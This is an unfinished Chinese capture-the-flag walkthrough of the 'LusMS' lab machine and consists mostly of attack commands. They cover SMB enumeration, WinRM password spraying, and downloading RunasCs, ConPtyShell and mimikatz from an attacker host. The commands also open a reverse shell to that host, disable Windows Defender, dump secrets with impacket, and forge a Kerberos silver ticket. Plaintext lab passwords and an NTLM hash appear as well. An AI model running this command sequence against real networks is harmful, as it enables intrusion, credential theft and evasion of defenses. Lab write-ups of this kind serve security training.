---
title: "LusMS"
date: "2026-04-08T23:21:43+08:00"
publishDate: "2026-04-08T23:21:43+08:00"
lastmod: "2026-04-08T23:21:43+08:00"
draft: true
unfinished: false
---
```
netexec smb 10.10.178.134 -u guest -p '' --shares
```

![image-20250106153143826](https://s2.loli.net/2025/01/06/ziDxtQPn9bq81Zl.png)

```
netexec winrm ip.txt -u ben.cox -p 'Trinity1'
```

![image-20250106154627890](https://files.seeusercontent.com/2026/04/06/nN0a/image-20250106154627890.png)

```
evil-winrm -i 10.10.178.134 -u ben.cox -p 'Trinity1'
```

![image-20250106160052124](https://s2.loli.net/2025/01/06/qnkebpcaZwIhMlo.png)

![image-20250106160122057](https://s2.loli.net/2025/01/06/KCqj4r9dNm1Rt3k.png)

```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">LUSMS\Administrator</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000d4ecf9dfb12aed4eab72b909047c4e560000000002000000000003660000c000000010000000d5ad4244981a04676e2b522e24a5e8000000000004800000a00000001000000072cd97a471d9d6379c6d8563145c9c0e48000000f31b15696fdcdfdedc9d50e1f4b83dda7f36bde64dcfb8dfe8e6d4ec059cfc3cc87fa7d7898bf28cb02352514f31ed2fb44ec44b40ef196b143cfb28ac7eff5f85c131798cb77da914000000e43aa04d2437278439a9f7f4b812ad3776345367</SS>
    </Props>
  </Obj>
</Objs>
```

貌似是一个加密过的密码，我们尝试解密

```
pwsh
$cred = Import-Clixml ./admin.xml
$password = $cred.GetNetworkCredential().Password
$password
```

![image-20250106160514800](https://s2.loli.net/2025/01/06/VS5iRTkWKLA1ptj.png)

没有返回内容

| username      | password                         |
| ------------- | -------------------------------- |
| Administrator | XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF |

我们使用这对密码继续进行爆破

```
netexec winrm ip.txt -u Administrator -p 'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'
```

![image-20250106160809395](https://files.seeusercontent.com/2026/04/08/2Izh/image-20250106160809395.png)

```
netexec rdp ip.txt -u Administrator -p 'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'
netexec smb ip.txt -u Administrator -p 'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'
netexec ldap ip.txt -u Administrator -p 'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'
```

均没有结果，我们尝试使用users.txt进行爆破

```
netexec winrm ip.txt -u users.txt -p 'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'
```

![image-20250106161838339](https://files.seeusercontent.com/2026/04/06/wq4L/image-20250106161838339.png)

```
#尝试使用runas提权
iwr http://10.8.4.161/RunasCs.exe -outfile RunasCs.exe
.\RunasCs.exe Administrator XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF -r 10.8.4.161:443 cmd
```

![image-20250106161820912](https://s2.loli.net/2025/01/06/UbMqKFlyIgr7SEA.png)

成功完成提权，获得第一个flag内容

![image-20250106161921968](https://files.seeusercontent.com/2026/04/08/rbR6/image-20250106161921968.png)

VL{40a034f5c60e429d1a210f09bd3c3548}

上传一个mimikatz，查看是否有什么可以利用的信息

```
iwr http://10.8.4.161/ConPtyShell.exe -outfile ConPtyShell.exe
sudo stty raw -echo; (stty size; cat) | nc -lvnp 3001
.\ConPtyShell.exe 10.8.4.161 3001
iwr http://10.8.4.161/mimikatz.exe -outfile mimikatz.exe
```

![image-20250106162649411](https://files.seeusercontent.com/2026/04/06/wcO0/image-20250106162649411.png)

但目标机器有防病毒

```
impacket-secretsdump 'lusms.lustrous.vl/administrator':'XZ9i=bgA8KhRP.f=jr**Qgd3Qh@n9dRF'@10.10.
178.134
```

![image-20250106165509498](https://s2.loli.net/2025/01/06/51MwLX3muF2ctWr.png)

因为我们现在是管理员权限，可以禁用Windowsdefender从而来实现后渗透

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

![image-20250106180021705](https://s2.loli.net/2025/01/06/MnxQ34VdbOJp1m6.png)

我们上传mimikatz.exe

```
.\mimikatz.exe
privilege::debug
```

Domain SID:

S-1-5-21-2355092754-1584501958-1513963426

SPN：

http/lusdc
http/lusdc.lustrous.vl

hash:

E67AF8B3D78DF5A02EB0D57B6CB60717

```
kerberos::golden /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /user:tony.ward /target:lusdc.lustrous.vl /id:1114 /service:http /ptt
```

```
Invoke-WebRequest -Uri http://lusdc.lustrous.vl/Internal -UseDefaultCredentials -UseBasicParsing | Select-Object -Expand Content
```

但这时还是显示我们我们权限

![image-20250106210842733](https://s2.loli.net/2025/01/06/u7HvKQh4pDEU9bW.png)

![image-20250106214135805](https://s2.loli.net/2025/01/06/9NIZsC6avhcpJlM.png)

```
然后我们查询本地发现我们的管理员权限不在域内，我们需要进行下域内提权
runas /noprofile /netonly /user:lustrous.vl\ben.cox cmd.exe
```

![image-20250106213546599](https://s2.loli.net/2025/01/06/DZy1na32LfcX8rJ.png)

![image-20250106213720980](https://s2.loli.net/2025/01/06/Dd8JEKNL5Zru3Gb.png)

![image-20250106213809991](https://s2.loli.net/2025/01/06/GugLOjbK6PeAxEd.png)

我们现在已经有了对应的权限，我们重新再执行一遍上述的银票环境

我们先删除之前的票证

```
klist purge
```

![image-20250106215501563](https://s2.loli.net/2025/01/06/KnWO7ebNEYcmFkr.png)

我们获取了相应tony.ward的密码

| username  | password       |
| --------- | -------------- |
| tony.ward | U_cPVQqEI50i1X |

我们尝试使用该账户密码登录域控


